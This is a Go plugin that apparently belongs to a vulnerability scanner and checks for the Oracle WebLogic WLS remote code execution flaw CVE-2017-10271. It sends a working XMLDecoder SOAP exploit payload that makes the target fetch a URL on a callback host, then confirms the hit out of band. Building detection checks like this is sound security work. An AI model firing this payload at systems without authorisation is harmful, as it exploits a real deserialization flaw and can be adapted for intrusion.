package goplugin

import (
    "fmt"
    "net/http"
    "strings"
    "vuldb/common"
    "vuldb/plugin"
)

type weblogicWLSRCE struct {
    info   common.PluginInfo
    result []common.PluginInfo
}

func init() {
    plugin.Regist("weblogic", &weblogicWLSRCE{})
}
func (d *weblogicWLSRCE) Init() common.PluginInfo{
    d.info = common.PluginInfo{
        Name:    "WebLogic WLS RCE ",
        Remarks: "Oracle WebLogic Server WLS安全组件中的缺陷导致远程命令执行，CVE-2017-10271",
        Level:   0,
        Type:    "RCE",
        Author:   "wolf",
        References: common.References{
        	URL: "",
        	CVE: "",
        },
    }
    return d.info
}
func (d *weblogicWLSRCE) GetResult() []common.PluginInfo {
    return d.result
}
func (d *weblogicWLSRCE) Check(URL string, meta plugin.TaskMeta) bool {
    if Aider == "" {
        return false
    }
    postData := `
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
      <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8" class="java.beans.XMLDecoder">
          <void class="java.net.URL">
            <string>%s/add/%s</string>
            <void method="openStream"/>
          </void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
  </soapenv:Envelope>`
    rand := getRandomString(5)
    postData = fmt.Sprintf(postData, Aider, rand)
    request, _ := http.NewRequest("POST", URL+"/wls-wsat/CoordinatorPortType", strings.NewReader(postData))
    request.Header.Set("Content-Type", "text/xml;charset=UTF-8")
    request.Header.Set("SOAPAction", "")
    resp, err := common.RequestDo(request, true)
    if err != nil {
        return false
    }
    if aiderCheck(rand) {
        result := d.info
        result.Response = resp.ResponseRaw
        result.Request = resp.RequestRaw
        d.result = append(d.result, result)
        return true
    }
    return false
}